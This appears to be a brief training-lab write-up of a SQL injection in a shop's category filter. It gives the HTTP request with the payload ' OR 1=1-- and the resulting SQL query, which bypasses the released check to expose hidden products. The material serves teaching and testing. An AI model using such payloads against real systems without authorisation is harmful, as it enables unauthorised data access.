# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

A SQLi exists in the category query parameter:

```http
GET /filter?category=’+OR+1=1--
```

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```
